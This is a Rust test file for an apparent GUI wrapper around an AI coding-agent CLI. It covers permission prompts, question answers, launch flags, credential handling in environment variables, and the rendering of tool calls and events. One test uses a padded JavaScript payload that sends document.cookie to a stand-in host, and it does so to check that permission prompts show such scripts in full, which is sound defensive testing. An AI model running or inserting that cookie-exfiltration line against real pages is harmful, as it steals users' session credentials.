            "mcp__forge-browser__navigate",
            &json!({"url": "https://example.com"}),
        );
        assert_eq!(title, "Allow Forge to open a page in the browser?");
        assert_eq!(detail, "https://example.com");
        let (title, detail) = ask_text("mcp__forge-browser__eval", &json!({}));
        assert_eq!(title, JS_ASK_TITLE);
        assert_eq!(detail, "The page in the side panel");
        // A long script is asked about whole, though its row shows a line.
        let script = format!(
            "(() => {{ {} return fetch('https://x.test/?c=' + document.cookie) }})()",
            "/* pad */ ".repeat(30)
        );
        let (_, detail) = ask_text("mcp__forge-browser__eval", &json!({ "expression": script }));
        assert_eq!(detail, script);
        let row = tool_call("mcp__forge-browser__eval", &json!({ "expression": script }));
        assert!(row.note.is_some_and(|n| n.ends_with('…')));
        let typed = "x".repeat(300);
        let (_, detail) = ask_text("mcp__forge-browser__type", &json!({ "text": typed }));
        assert_eq!(detail, typed);
    }

    #[test]
    fn questions_are_answered_in_the_calls_input() {
        let input = json!({ "questions": [
            { "question": "Which stack?", "header": "Stack", "multiSelect": false,
              "options": [{ "label": "Tauri", "description": "a" }, { "label": "Leptos", "description": "b" }] },
            { "question": "Which targets?", "header": "Targets", "multiSelect": true,
              "options": [{ "label": "Windows", "description": "" }, { "label": "Linux", "description": "" }] },
            { "question": "Name?", "header": "Name", "multiSelect": false,
              "options": [{ "label": "folio", "description": "" }, { "label": "notes", "description": "" }] } ] });
        let mut qs = questions(&input);
        assert_eq!(qs.len(), 3);
        assert_eq!(
            (qs[0].header.as_str(), qs[0].options[1].label.as_str()),
            ("Stack", "Leptos")
        );
        assert!(qs[1].multi && !qs[0].multi);
        assert_eq!(ask_text(QUESTION_TOOL, &input).0, "Forge has 3 questions");
        qs[0].picked = vec![0];
        qs[1].picked = vec![0, 1];
        qs[2].own = Some("my-notes".into());
        let line = questions_answer_line("r1", &input, &qs);
        let r = &line["response"]["response"];
        assert_eq!(r["behavior"], "allow");
        assert_eq!(r["updatedInput"]["questions"], input["questions"]);
        assert_eq!(
            r["updatedInput"]["answers"],
            json!({ "Which stack?": "Tauri", "Which targets?": "Windows, Linux", "Name?": "my-notes" })
        );
        let skip = skip_questions_line("r1");
        assert_eq!(skip["response"]["response"]["behavior"], "deny");
        assert!(always_asks(QUESTION_TOOL) && always_asks("ExitPlanMode") && !always_asks("Bash"));
    }

    #[test]
    fn permission_requests_and_errors() {
        let ev = parse(&[
            json!({"type":"control_request","request_id":"forge-req-1","request":{"subtype":"can_use_tool","tool_name":"Write","input":{"file_path":"/p/a.txt","content":"x"},"permission_suggestions":[{"type":"addRules"}]}}),
            json!({"type":"result","is_error":true,"stop_reason":"end_turn","duration_ms":3,"errors":["HTTP 401: bad key"]}),
            json!({"type":"result","is_error":true,"stop_reason":"interrupted","duration_ms":3}),
        ]);
        assert!(
            matches!(&ev[0], Event::Ask { request_id, tool_name, .. } if request_id == "forge-req-1" && tool_name == "Write")
        );
        assert!(matches!(&ev[1], Event::TurnEnd { error: Some(e), .. } if e.contains("401")));
        assert!(matches!(&ev[2], Event::TurnEnd { error: None, .. }));
    }

    #[test]
    fn answers_carry_the_input_and_always_carries_the_rules() {
        let input = json!({"command":"ls"});
        let sugg = json!([{"type":"addRules"}]);
        let a = answer_line("r1", true, true, &input, &sugg, None);
        assert_eq!(a["response"]["request_id"], "r1");
        assert_eq!(a["response"]["response"]["behavior"], "allow");
        assert_eq!(a["response"]["response"]["updatedInput"], input);
        assert_eq!(a["response"]["response"]["updatedPermissions"], sugg);
        let once = answer_line("r1", true, false, &input, &sugg, None);
        assert!(once["response"]["response"]
            .get("updatedPermissions")
            .is_none());
        assert_eq!(
            answer_line("r1", false, false, &input, &sugg, None)["response"]["response"]
                ["behavior"],
            "deny"
        );
        // Denied with your words: Forge gets them, not just a no.
        let said = answer_line(
            "r1",
            false,
            false,
            &input,
            &sugg,
            Some("Use lib.rs instead"),
        );
        let message = said["response"]["response"]["message"].as_str().unwrap();
        assert!(message.contains("Use lib.rs instead"), "{message}");
    }

    /// Every flag `forge --help` lists (ForgeCLI `ccr-02a743e1-1gmu4f`).
    const FORGECLI_FLAGS: &[&str] = &[
        "--add-dir", "--agent", "--agents", "--allow-dangerously-skip-permissions",
        "--allowedTools", "--append-system-prompt", "--append-system-prompt-file",
        "--autocompact", "--autonomous", "--bare", "--betas", "--color", "--continue",
        "--dangerously-skip-permissions", "--debug", "--debug-file", "--disallowedTools",
        "--effort", "--exclude-dynamic-system-prompt-sections", "--fallback-model",
        "--fork-session", "--help", "--include-hook-events", "--include-partial-messages",
        "--input-format", "--json-schema", "--max-budget-usd", "--max-time", "--max-turns",
        "--mcp-config", "--model", "--name", "--no-input", "--no-session-persistence",
        "--no-tui", "--output-format", "--permission-mode", "--permission-prompt-tool",
        "--permission-prompts", "--plugin-dir", "--print", "--quiet", "--replay-user-messages",
        "--resume", "--safe-mode", "--sandbox", "--session-id", "--setting-sources",
        "--settings", "--strict-mcp-config", "--system-prompt", "--system-prompt-file",
        "--tools", "--verbose", "--version", "--worktree",
    ];

    #[test]
    fn every_forgecli_flag_reaches_forgecli() {
        let flag = |a: &String| a.split('=').next().unwrap_or(a).to_string();
        let mut covered: std::collections::BTreeSet<String> = Default::default();
        // What every chat's process is started with (`launch`).
        let p: Profile = serde_json::from_value(json!({"name":"x","baseUrl":"https://gw.example/v1","wire":"anthropic","model":"m1","auth":{"type":"none"}})).unwrap();
        let id = "0b9a1f2e-3c4d-4e5f-8a6b-7c8d9e0f1a2b";
        for c in [Conversation::New(id), Conversation::Fork { from: id, id }] {
            let l = launch(&p, ModeId::Manual, true, c).unwrap();
            covered.extend(l.args.iter().filter(|a| a.starts_with("--")).map(flag));
        }
        covered.insert("--print".into()); // passed as `-p`
        // Every `forge.*` setting on at once (`app_settings::Settings::forge_args`).
        let all = crate::app_settings::Settings::parse(&json!({
            "forge.fallbackModel": "m2", "forge.maxTurns": 5, "forge.maxBudgetUsd": 1.0,
            "forge.maxTimeMinutes": 5, "forge.worktree": true, "forge.autonomous": true,
            "forge.addDirs": ["/a"], "forge.agent": "r", "forge.tools": ["Read"],
            "forge.allowedTools": ["Read"], "forge.disallowedTools": ["Write"],
            "forge.sandbox": "off", "forge.systemPrompt": "p", "forge.systemPromptFile": "/f",
            "forge.excludeDynamicSystemPromptSections": true, "forge.strictMcpConfig": true,
            "forge.settingSources": "user", "forge.bare": true, "forge.safeMode": true,
            "forge.betas": ["b"], "forge.debug": "", "forge.debugFile": "/d",
            "forge.autocompact": "auto", "forge.includeHookEvents": true,
            "forge.noSessionPersistence": true, "forge.noInput": true,
            "forge.jsonSchema": {"type": "object"}, "forge.agents": {"r": {"prompt": "x"}},
            "forge.mcpConfig": ["/m.json"], "forge.pluginDirs": ["/p"],
            "forge.permissionPrompts": "none", "forge.quiet": true, "forge.color": "never"
        }).to_string());
        covered.extend(all.forge_args(true).iter().map(flag));
        // `forge.verbose` (quiet wins when both are set) and a prompt file
        // (a prompt written out wins).
        let verbose = crate::app_settings::Settings::parse(
            r#"{"forge.verbose": true, "forge.systemPromptFile": "/f"}"#,
        );
        covered.extend(verbose.forge_args(true).iter().map(flag));
        // Set by the app around `launch` (`AppState::start_session`,
        // `AppState::forge_terminal`): the model menu's effort, the chat
        // title, the settings profile, design and browser tools, the design
        // prompt (with `forge.appendSystemPrompt` joining Forge's own), and in
        // the dock the folder's latest conversation and the line prompt.
        covered.extend(
            ["--effort", "--name", "--settings", "--mcp-config", "--append-system-prompt-file",
             "--continue", "--no-tui"]
                .map(String::from),
        );
        // Bypass permissions is ForgeCLI's own skip; `--help` and
        // `--version` answer in the dock's ForgeCLI shell.
        covered.extend(["--dangerously-skip-permissions", "--help", "--version"].map(String::from));
        let missing: Vec<&&str> =
            FORGECLI_FLAGS.iter().filter(|f| !covered.contains(**f)).collect();
        assert!(missing.is_empty(), "not reached: {missing:?}");
    }

    #[test]
    fn the_endpoint_goes_in_variables_never_arguments() {
        let p: Profile = serde_json::from_value(json!({"name":"x","baseUrl":"https://gw.example/v1","wire":"anthropic","model":"m1","auth":{"type":"bearer","token":"${env:FORGE_GPUI_TEST_KEY}"}})).unwrap();
        std::env::set_var("FORGE_GPUI_TEST_KEY", "sk-test");
        let id = "0b9a1f2e-3c4d-4e5f-8a6b-7c8d9e0f1a2b";
        let l = launch(&p, ModeId::Manual, false, Conversation::New(id)).unwrap();
        assert!(l.args.windows(2).any(|w| w == ["--session-id", id]));
        let r = launch(&p, ModeId::Manual, false, Conversation::Resume(id)).unwrap();
        assert!(
            r.args.windows(2).any(|w| w == ["--resume", id])
                && !r.args.iter().any(|a| a == "--session-id")
        );
        assert!(!l.args.iter().any(|a| a.contains("sk-test")));
        assert!(l
            .env
            .contains(&("FORGE_BASE_URL".into(), "https://gw.example".into())));
        assert!(l.env.contains(&("FORGE_API_KEY".into(), "sk-test".into())));
        assert!(l.args.windows(2).any(|w| w == ["--model", "m1"]));
        assert!(l
            .args
            .windows(2)
            .any(|w| w == ["--permission-mode", "default"]));
        // The model is told Diagram Design is the default, and that a
        // format the user names (Mermaid, ASCII, ...) wins.
        let surface = l
            .args
            .windows(2)
            .find(|w| w[0] == "--append-system-prompt")
            .map(|w| w[1].clone())
            .unwrap();
        assert!(surface.contains("Diagram Design is the default"));
        assert!(surface.contains("unless the user names another format"));
        assert!(surface.contains("```mermaid") && surface.contains("ASCII"));
        // An HTML page is looked at, critiqued and revised, three rounds at most.
        assert!(surface.contains("When you write or change an HTML page"));
        assert!(surface.contains("use the design skill"));
        assert!(surface.contains("after three rounds"));
        let o: Profile = serde_json::from_value(
            json!({"name":"o","baseUrl":"http://127.0.0.1:11434","wire":"openai","model":"q"}),
        )
        .unwrap();
        let l = launch(&o, ModeId::Manual, false, Conversation::New(id)).unwrap();
        assert!(l.env.contains(&(
            "FORGE_OPENAI_BASE_URL".into(),
            "http://127.0.0.1:11434/v1".into()
        )));
        // Gemini: ForgeCLI's native wire, the base URL as written.
        let g: Profile = serde_json::from_value(json!({"name":"g","baseUrl":"https://generativelanguage.googleapis.com/v1beta/","wire":"gemini","model":"gemini-3-flash-preview"}))
        .unwrap();
        let l = launch(&g, ModeId::Manual, false, Conversation::New(id)).unwrap();
        assert!(l.env.contains(&(
            "FORGE_GEMINI_BASE_URL".into(),
            "https://generativelanguage.googleapis.com/v1beta".into()
        )));
        assert!(!l
            .env
            .iter()
            .any(|(k, _)| k == "FORGE_BASE_URL" || k == "FORGE_OPENAI_BASE_URL"));
    }

    #[test]
    fn a_read_picture_comes_back_as_an_image() {
        let content = json!([
            {"type": "image", "source": {"type": "base64", "media_type": "image/png", "data": "aGk="}},
            {"type": "image", "source": {"type": "base64", "media_type": "image/bmp", "data": "aGk="}},
            {"type": "text", "text": "x"}
        ]);
        let found = result_images(&content, Some("/p/shots/a.png"));
        assert_eq!(found.len(), 1, "a format Forge can't show is skipped");
        assert_eq!(found[0].name.as_ref(), "a.png");
        assert_eq!(found[0].path.as_deref(), Some("/p/shots/a.png"));
        assert_eq!(found[0].image.bytes(), b"hi");
        assert!(result_images(&json!("text"), None).is_empty());
    }

    #[test]
    fn tool_rows() {
        let c = tool_call(
            "Edit",
            &json!({"file_path":"src/a.rs","old_string":"a","new_string":"b\nc"}),
        );
        assert_eq!(c.kind, ToolKind::Edit);
        assert_eq!(c.diff.len(), 3);
        let c = tool_call("Grep", &json!({"pattern":"fn main","path":"src"}));
        assert_eq!(c.target.as_ref(), "fn main in src");
        assert_eq!(
            tool_call("Task", &json!({"description":"look"})).kind,
            ToolKind::Other
        );
    }

    /// ForgeCLI's `system` events reach the chat as plain lines; the ones
    /// shown elsewhere or meant only for the model don't.
    #[test]
    fn the_terminal_ui_gets_the_chat_without_the_host_protocol() {
        let l = Launch {
            args: ["-p", "--input-format", "stream-json", "--output-format", "stream-json",
                "--include-partial-messages", "--permission-prompt-tool", "stdio", "--model", "m",
                "--permission-mode", "plan", "--replay-user-messages", "--resume", "abc",
                "--json-schema={}", "--no-input", "--sandbox=off"]
                .iter()
                .map(|s| s.to_string())
                .collect(),
            env: vec![("FORGE_API_KEY".into(), "k".into())],
        };
        let i = interactive(&l);
        assert_eq!(
            i.args,
            ["--model", "m", "--permission-mode", "plan", "--resume", "abc", "--sandbox=off"]
        );
        assert_eq!(i.env, l.env);
    }

    #[test]
    fn hook_runs_read_from_forgecli_stderr() {
        // As ForgeCLI writes it with --verbose --debug=hooks.
        let lines = [
            "forge: warning: Forge doesn't know the model mock-model",
            "2026-10-29T12:56:12.998425Z DEBUG forge_engine::exec: tool call tool=\"TodoWrite\"",
            "2026-10-29T12:56:12.998519Z DEBUG forge_hooks: running hooks event=\"PostToolUse\" matcher=Some(\"TodoWrite\") hooks=1",
            "PostToolUse hook error (exit 3): boom",
            "2026-10-29T12:56:13.013753Z DEBUG forge_engine::engine: model response ms=10",
            "2026-10-29T12:56:13.084105Z DEBUG forge_hooks: running hooks event=\"PreToolUse\" matcher=Some(\"Bash\") hooks=1",
            "lint hook: Bash looks fine",
            "2026-10-29T12:56:13.093005Z DEBUG forge_engine::exec: tool call tool=\"Bash\"",
            "2026-10-29T12:56:14.000000Z DEBUG forge_hooks: running hooks event=\"Stop\" matcher=None hooks=1",
        ];
        let mut log = HookLog::default();
        let mut events: Vec<Event> = lines.iter().filter_map(|l| log.line(l)).collect();
        events.extend(log.flush());
        let mut said: Vec<String> = events
            .into_iter()
            .map(|e| match e {
                Event::Notice { text, error } => {
                    assert!(!error);
                    text
                }
                _ => unreachable!(),
            })
            .collect();
        assert_eq!(said.remove(0), "PostToolUse hook on TodoWrite: PostToolUse hook error (exit 3): boom");
        assert_eq!(said.remove(0), "PreToolUse hook on Bash: lint hook: Bash looks fine");
        assert_eq!(said.remove(0), "Stop hook ran.");
        assert!(said.is_empty());
        // A warning outside a hook run is not a hook's.
        assert!(HookLog::default().line("forge: warning: something").is_none());
    }

    #[test]
    fn a_structured_result_shows_under_the_reply() {
        let ev = parse(&[json!({"type":"result","is_error":false,"duration_ms":5,"usage":{},"structured_output":{"ok":true}})]);
        let text: String = ev
            .iter()
            .filter_map(|e| match e {
                Event::Text(t) => Some(t.as_str()),
                _ => None,
            })
            .collect();
        assert!(text.contains("```json\n{\n  \"ok\": true\n}\n```"), "{text}");
        assert!(matches!(ev.last(), Some(Event::TurnEnd { .. })));
        let plain = parse(&[json!({"type":"result","is_error":false,"duration_ms":5,"usage":{}})]);
        assert!(!plain.iter().any(|e| matches!(e, Event::Text(_))));
    }

    #[test]
    fn forgecli_events_read_as_lines_in_the_chat() {
        let notice = |line: Value| {
            let mut p = Parser::default();
            p.line(&line.to_string())
                .into_iter()
                .find_map(|e| match e {
                    Event::Notice { text, error } => Some((text, error)),
                    _ => None,
                })
        };
        let (t, err) = notice(json!({"type":"system","subtype":"compact_boundary","compact_metadata":{"trigger":"auto","pre_tokens":152400}})).unwrap();
        assert!(t.contains("compacted") && t.contains("152k") && !err, "{t}");
        assert!(notice(json!({"type":"system","subtype":"compact_boundary","compact_metadata":{"trigger":"manual"}})).is_none());
        let (t, err) = notice(json!({"type":"system","subtype":"model_fallback","from":"big","to":"small","reason":"HTTP 529 (overloaded_error) from http://x/v1/messages: Overloaded"})).unwrap();
        assert_eq!(t, "big was unavailable, so this turn goes on with small. (it was overloaded)");
        let (t, _) = notice(json!({"type":"system","subtype":"model_fallback","from":"big","to":"small","reason":"socket closed"})).unwrap();
        assert_eq!(t, "big was unavailable, so this turn goes on with small.");
        assert!(!err);
        let (t, _) = notice(json!({"type":"system","subtype":"subtask","id":"s1","status":"started","task":"audit deps"})).unwrap();
        assert_eq!(t, "Subtask started in the background: audit deps");
        let (t, err) = notice(json!({"type":"system","subtype":"subtask","status":"completed","task":"audit deps","num_tool_calls":4,"duration_ms":31000,"handed_back":true})).unwrap();
        assert!(t.starts_with("Subtask finished: audit deps (4 tool calls, 31s).") && !err, "{t}");
        let (t, err) = notice(json!({"type":"system","subtype":"loop_guard","kind":"repeated_failure","tool":"Bash","count":3})).unwrap();
        assert!(t.starts_with("Bash failed 3 times in a row") && !err, "{t}");
        let (t, _) = notice(json!({"type":"system","subtype":"verification","kind":"unchecked","files":["a.rs","b.rs"]})).unwrap();
        assert!(t.contains("2 files"), "{t}");
        let (t, _) = notice(json!({"type":"system","subtype":"hook_response","hook_name":"PostToolUse:Edit","outcome":"error","exit_code":2,"stderr":"lint failed\nmore"})).unwrap();
        assert_eq!(t, "Hook PostToolUse:Edit failed: lint failed more");
        let (t, _) = notice(json!({"type":"system","subtype":"hook_response","hook_event":"Stop","outcome":"success"})).unwrap();
        assert_eq!(t, "Hook Stop ran");
        assert!(notice(json!({"type":"system","subtype":"hook_started","hook_name":"x"})).is_none());
        // As ForgeCLI's engine sends it (`forge-engine`, `api_retry`).
        let (t, _) = notice(json!({"type":"system","subtype":"api_retry","attempt":2,"retry_delay_ms":3500,"error":"HTTP 529 (overloaded_error) from http://x/v1/messages: Overloaded"})).unwrap();
        assert_eq!(t, "The model call failed (it was overloaded); trying again in 4s (attempt 2).");
        let (t, err) = notice(json!({"type":"system","subtype":"background_exit","shells":[{"id":"b1","command":"cargo build","exit_code":101,"seconds":40}]})).unwrap();
        assert_eq!(t, "In the background: cargo build exited with 101 after 40s.");
        assert!(!err);
        let (t, _) = notice(json!({"type":"system","subtype":"tool_input_repaired","tool":"Edit","problem":"invalid JSON"})).unwrap();
        assert!(t.starts_with("Edit was called with input it couldn't read"), "{t}");
        // Shown elsewhere, or only for the model.
        for sub in ["init", "status", "goal", "todo_reminder", "next_step_reminder", "attempt_reminder"] {
            assert!(notice(json!({"type":"system","subtype":sub})).is_none(), "{sub}");
        }
    }

    /// Every tool ForgeCLI offers (its `system/init` `tools`, plus Advisor
    /// and the MCP resource tools when they apply) reads as words, never as
    /// its identifier, and says what it acts on.
    #[test]
    fn every_forgecli_tool_reads_as_words() {
        let calls = [
            ("Bash", json!({"command": "cargo test"})),
            ("BashOutput", json!({"bash_id": "b1"})),
            ("KillShell", json!({"shell_id": "b1"})),
            ("Glob", json!({"pattern": "**/*.rs"})),
            ("Grep", json!({"pattern": "fn main"})),
            ("LS", json!({"path": "src"})),
            ("Read", json!({"file_path": "a.rs"})),
            ("Edit", json!({"file_path": "a.rs", "old_string": "a", "new_string": "b"})),
            ("MultiEdit", json!({"file_path": "a.rs", "edits": []})),
            ("Write", json!({"file_path": "a.rs", "content": "x"})),
            ("NotebookEdit", json!({"notebook_path": "n.ipynb"})),
            ("TodoWrite", json!({"todos": []})),
            ("AskUserQuestion", json!({"questions": []})),
            ("EnterPlanMode", json!({})),
            ("ExitPlanMode", json!({"plan": "1. x"})),
            ("WebFetch", json!({"url": "https://example.com"})),
            ("WebSearch", json!({"query": "rust"})),
            ("Skill", json!({"skill": "simplify"})),
            ("CronCreate", json!({"cron": "*/5 * * * *", "prompt": "check CI", "recurring": true})),
            ("CronList", json!({})),
            ("CronDelete", json!({"id": "t1"})),
            ("ScheduleWakeup", json!({"delaySeconds": 1200, "reason": "watching CI", "prompt": "x"})),
            ("Task", json!({"description": "look", "prompt": "p", "subagent_type": "Explore"})),
            ("Advisor", json!({"question": "Is this safe?"})),
            ("ListMcpResourcesTool", json!({"server": "docs"})),
            ("ReadMcpResourceTool", json!({"server": "docs", "uri": "docs://a"})),
            ("mcp__github__list_issues", json!({})),
        ];
        for (name, input) in calls {
            let shown = tool_call(name, &input).shown_target();
            assert!(
                !shown.is_empty() && shown.as_ref() != name || name == "Bash",
                "{name} shows as {shown:?}"
            );
            assert!(!shown.contains("mcp__"), "{name} shows as {shown:?}");
        }
        assert_eq!(tool_call("LS", &json!({"path": "src"})).target.as_ref(), "src");
        let c = tool_call("ScheduleWakeup", &json!({"delaySeconds": 1200, "reason": "watching CI"}));
        assert_eq!(c.note.as_deref(), Some("in 20 min: watching CI"));
        let c = tool_call("CronCreate", &json!({"cron": "0 9 * * 1", "prompt": "standup", "recurring": false}));
        assert_eq!(c.note.as_deref(), Some("0 9 * * 1, once: standup"));
        assert_eq!(
            tool_call("mcp__github__list_issues", &json!({})).shown_target().as_ref(),
            "github · list issues"
        );
    }
}
